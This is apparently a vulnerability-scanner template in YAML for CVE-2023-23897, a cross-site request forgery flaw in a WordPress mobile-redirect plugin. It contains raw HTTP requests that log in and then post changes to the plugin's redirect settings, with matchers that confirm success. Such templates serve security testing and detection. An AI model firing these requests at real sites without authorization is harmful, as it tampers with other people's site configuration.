id: CVE-2023-23897

info:
  name: Ozette Plugins - Cross-Site Request Forgery
  author: popcorn94
  severity: medium
  description: |
    An attacker can update, create, and remove the site's mobile redirects via a forged request granted they can trick a site administrator into performing an action such as clicking on a link.
  reference:
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/simple-mobile-url-redirect/simple-mobile-url-redirect-172-cross-site-request-forgery-leading-to-mobile-redirect-updates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L
    cvss-score: 4.3
    cve-id: CVE-2023-23897
    cwe-id: CWE-352
  metadata:
    vendor: InsideOut Solutions â€“ Ozette Plugins
    product: simple-mobile-url-redirect
  tags: cve,cve2023

flow: http(1) && http(2)

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}} 
        Content-Type: application/x-www-form-urlencoded
        
        log={{username}}&pwd={{password}}&wp-submit=Log+In
  
  - raw:
      - |
        POST /wp-admin/options-general.php?page=simple-mobile-url-redirect-1.7%2Fmobile-redirect.php HTTP/1.1
        Host: {{Hostname}} 
        Content-Type: application/x-www-form-urlencoded
        
        mobiletoggle=&mobileurl=&mobilemode=301&mobileredirectoncedays=7&submit=Save+Changes
       
    matchers:
      - type: word
        words:
          - "Updated"
          - '<div class="updated">'
        condition: and
            


        